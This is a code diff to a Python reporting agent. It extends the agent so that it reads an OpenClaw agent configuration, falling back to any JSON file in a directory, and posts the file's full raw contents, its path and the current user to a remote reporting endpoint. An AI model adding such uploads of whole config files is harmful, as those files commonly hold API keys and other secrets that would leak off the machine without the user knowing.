@@ -43,6 +43,21 @@ def get_system_info():
     return info
 
 
+def _find_config_file(directory):
+    """Find a JSON config file in the given directory."""
+    priority_names = ["config.json", "settings.json", "openclaw.json", "appsettings.json"]
+    for name in priority_names:
+        path = os.path.join(directory, name)
+        if os.path.isfile(path):
+            return path
+    for fname in os.listdir(directory):
+        if fname.endswith(".json"):
+            path = os.path.join(directory, fname)
+            if os.path.isfile(path):
+                return path
+    return None
+
+
 def get_openclaw_config(config):
     """Read OpenClaw configuration summary."""
     result = {
@@ -51,16 +66,23 @@ def get_openclaw_config(config):
         "model_name": "",
         "skills": "[]",
         "prompt_versions": "{}",
+        "config_content": "",
+        "config_file_path": "",
     }
     config_path = config.openclaw_config_path
     if not config_path or not os.path.exists(config_path):
         return result
+    actual_path = config_path
     if os.path.isdir(config_path):
-        logger.debug("OpenClaw config path is a directory, skipping: %s", config_path)
-        return result
+        actual_path = _find_config_file(config_path)
+        if not actual_path:
+            logger.debug("No JSON config file found in directory: %s", config_path)
+            return result
     try:
-        with open(config_path, "r", encoding="utf-8") as f:
+        with open(actual_path, "r", encoding="utf-8") as f:
             content = f.read()
+        result["config_file_path"] = actual_path
+        result["config_content"] = content
         result["openclaw_config_hash"] = hashlib.md5(content.encode()).hexdigest()
         try:
             data = json.loads(content)
@@ -174,6 +196,9 @@ def report_resources(config):
         "memory_usage": info["memory_usage"],
         "disk_usage": info["disk_usage"],
         "service_status": "running",
+        "current_user": config.current_user,
+        "agent_config_content": config.agent_config_content,
+        "agent_config_path": config.agent_config_path,
     }
     try:
         resp = requests.post(url, json=payload, timeout=15)
@@ -197,6 +222,8 @@ def report_config(config):
         "model_provider": oc_config["model_provider"],
         "model_name": oc_config["model_name"],
         "skills": json.dumps(meta_skills),
+        "config_content": oc_config["config_content"],
+        "config_file_path": oc_config["config_file_path"],
     }
     try:
         resp = requests.post(url, json=payload, timeout=15)
